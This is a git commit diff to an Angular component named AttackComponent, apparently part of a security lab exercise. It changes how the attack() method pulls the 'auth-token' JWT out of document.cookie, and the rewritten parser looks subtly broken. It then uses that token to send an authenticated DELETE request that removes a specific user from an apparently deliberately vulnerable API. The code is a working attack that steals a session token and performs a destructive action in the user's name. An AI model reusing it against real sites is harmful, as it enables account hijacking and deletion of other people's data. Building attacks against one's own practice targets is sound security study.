6e93fc0a4169f2873fe0f2e329b82d08066fa71f
luzivangois <luzivangois@outlook.com>
2025-02-06 18:32:16 -0300

    alterado o método para pegar o token jwt do cookie

--- src/app/attack/attack.component.ts
+++ src/app/attack/attack.component.ts
@@ -10,7 +10,7 @@ export class AttackComponent {
   constructor(private http: HttpClient) {}
 
   attack() {
-    const token = this.getCookie("auth-token");
+    const token = this.getJwtToken();
     const headers = new HttpHeaders().set('Authorization', `Bearer ${token}`);
   
     this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
@@ -22,11 +22,24 @@ export class AttackComponent {
     });
 }
 
-getCookie(name: string): string | null {
-  const value = `; ${document.cookie}`;
-  console.log(value);
-  const parts = value.split(`; ${name}=`);
-  if (parts.length === 2) return parts.pop()?.split(';').shift() || null;
-  return null;
+// getCookie(name: string): string | null {
+//   const value = `; ${document.cookie}`;
+//   console.log(value);
+//   const parts = value.split(`; ${name}=`);
+//   if (parts.length === 2) return parts.pop()?.split(';').shift() || null;
+//   return null;
+//   }
+  getJwtToken(): string | null {
+    const name = 'auth-token';
+    const decodedCookie = decodeURIComponent(document.cookie);
+    const cookies = decodedCookie.split(';');
+
+    for (let cookie of cookies) {
+      cookie = cookie.trim();
+      if (cookie.startsWith(name)) {
+        return cookie.substring(name.length);
+      }
+    }
+    return null;
   }
 }
